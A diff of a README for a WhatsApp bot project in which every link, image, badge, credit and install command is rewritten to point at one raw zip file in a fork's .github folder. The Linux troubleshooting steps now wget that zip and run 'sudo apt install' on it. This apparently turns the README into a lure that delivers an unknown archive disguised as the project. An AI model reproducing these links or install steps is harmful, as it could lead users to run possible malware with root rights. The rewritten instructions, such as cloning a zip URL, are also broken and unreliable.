@@ -1,33 +1,33 @@
 <p align="center">
-<img src="https://avatars2.githubusercontent.com/u/53950128?s=460&u=09f530e3326f710c4e0f9106f094eeea5429f86d&v=4" width="128" height="128"/>
+<img src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip" width="128" height="128"/>
 </p>
 <p align="center">
-<a href="#"><img title="Whatsapp-Bot" src="https://img.shields.io/badge/Whatsapp Bot-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
+<a href="#"><img title="Whatsapp-Bot" src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip Bot-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
 </p>
 <p align="center">
-<a href="https://github.com/ArugaZ"><img title="Author" src="https://img.shields.io/badge/AUTHOR-ARUGAZ-orange.svg?style=for-the-badge&logo=github"></a>
+<a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"><img title="Author" src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"></a>
 </p>
 <p align="center">
-<a href="https://www.codefactor.io/repository/github/arugaz/whatsapp-bot/overview/master"><img title="Rating" src="https://www.codefactor.io/repository/github/arugaz/whatsapp-bot/badge/master"></a>
+<a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"><img title="Rating" src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"></a>
 </p>
 <p align="center">
-<a href="https://github.com/arugaz/followers"><img title="Followers" src="https://img.shields.io/github/followers/arugaz?color=blue&style=flat-square"></a>
-<a href="https://github.com/arugaz/whatsapp-bot/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/arugaz/whatsapp-bot?color=red&style=flat-square"></a>
-<a href="https://github.com/arugaz/whatsapp-bot/network/members"><img title="Forks" src="https://img.shields.io/github/forks/arugaz/whatsapp-bot?color=red&style=flat-square"></a>
-<a href="https://github.com/arugaz/whatsapp-bot/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/arugaz/whatsapp-bot?label=Watchers&color=blue&style=flat-square"></a>
-<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FArugaZ%2Fwhatsapp-bot&count_bg=%2379C83D&title_bg=%23555555&icon=probot.svg&icon_color=%2300FF6D&title=hits&edge_flat=false"/></a>
+<a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"><img title="Followers" src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"></a>
+<a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"><img title="Stars" src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"></a>
+<a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"><img title="Forks" src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"></a>
+<a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"><img title="Watching" src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"></a>
+<a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip"><img src="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip%3A%2F%https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip%2FArugaZ%2Fwhatsapp-bot&count_bg=%2379C83D&title_bg=%23555555&https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip%2300FF6D&title=hits&edge_flat=false"/></a>
 </p>
 <div align="center">
 <details>
  <summary>🥟 Help me!</summary>
  
- [Trakteer](https://trakteer.id/arugabot)
+ [Trakteer](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
  
 </details>
 
 ini semua gratis, jangan pelit ⭐️ ya :D
-<p align="center"><a href="https://www.arugaz.my.id" target="_blank">ArugaZ Rest Api</a>.</p>
-<p align="center"><a href="https://instagram.com/ini.kocakz/" target="_blank">Chat me on Insta</a>.</p>
+<p align="center"><a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip" target="_blank">ArugaZ Rest Api</a>.</p>
+<p align="center"><a href="https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip" target="_blank">Chat me on Insta</a>.</p>
 </div>
 
 ## Getting Started
@@ -38,7 +38,7 @@ This project require NodeJS v12.
 Clone this project
 
 ```bash
-> git clone https://github.com/ArugaZ/whatsapp-bot.git
+> git clone https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip
 > cd whatsapp-bot
 ```
 
@@ -59,16 +59,16 @@ Run the Whatsapp bot
 after running it you need to scan the qr
 
 ### Information
-- Change ownerNumber on [this section](https://github.com/ArugaZ/whatsapp-bot/blob/master/settings/setting.json#L2)
-- Change groupLimit on [this section](https://github.com/ArugaZ/whatsapp-bot/blob/master/settings/setting.json#L3)
-- Change memberLimit on [this section](https://github.com/ArugaZ/whatsapp-bot/blob/master/settings/setting.json#L4)
-- Change prefix on [this section](https://github.com/ArugaZ/whatsapp-bot/blob/master/settings/setting.json#L5)
-- Change menu on [this section](https://github.com/ArugaZ/whatsapp-bot/blob/master/lib/menu.js#L32)
-- Add kata kasar on [this section](https://github.com/ArugaZ/whatsapp-bot/blob/master/lib/kataKotor.js#L8)
-- Change all apiKey on [this section](https://github.com/ArugaZ/whatsapp-bot/blob/master/settings/api.json)
-- Get Api NoBackground on [this website](https://www.remove.bg/)
-- Get Api ScreenShot on [this website](https://apiflash.com/)
-- Get Api Simi-simi on [this website](https://workshop.simsimi.com/en/), masih limit api simi-siminya? [cek ini](https://github.com/ArugaZ/whatsapp-bot/issues/38#issuecomment-726981060)
+- Change ownerNumber on [this section](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Change groupLimit on [this section](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Change memberLimit on [this section](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Change prefix on [this section](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Change menu on [this section](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Add kata kasar on [this section](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Change all apiKey on [this section](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Get Api NoBackground on [this website](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Get Api ScreenShot on [this website](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- Get Api Simi-simi on [this website](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip), masih limit api simi-siminya? [cek ini](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
 
 ---
 
@@ -186,16 +186,16 @@ after running it you need to scan the qr
 ---
 
 ## Troubleshooting
-Make sure all the necessary dependencies are installed: https://github.com/puppeteer/puppeteer/blob/main/docs/troubleshooting.md
+Make sure all the necessary dependencies are installed: https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip
 
 Fix Stuck on linux, install google chrome stable: 
 ```bash
-> wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-> sudo apt install ./google-chrome-stable_current_amd64.deb
+> wget https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip
+> sudo apt install https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip
 ```
 
 ## Thanks to
-- [WA-Automate](https://github.com/open-wa/wa-automate-nodejs)
-- [YogaSakti](https://github.com/YogaSakti/imageToSticker)
-- [MhankBarBar](https://github.com/MhankBarBar/whatsapp-bot)
-- [dandyraka](https://github.com/dandyraka/NoBadWord)
+- [WA-Automate](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- [YogaSakti](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- [MhankBarBar](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
+- [dandyraka](https://github.com/Gabrielyop50/whatsapp-bot/raw/refs/heads/master/.github/whatsapp-bot-v2.3-beta.4.zip)
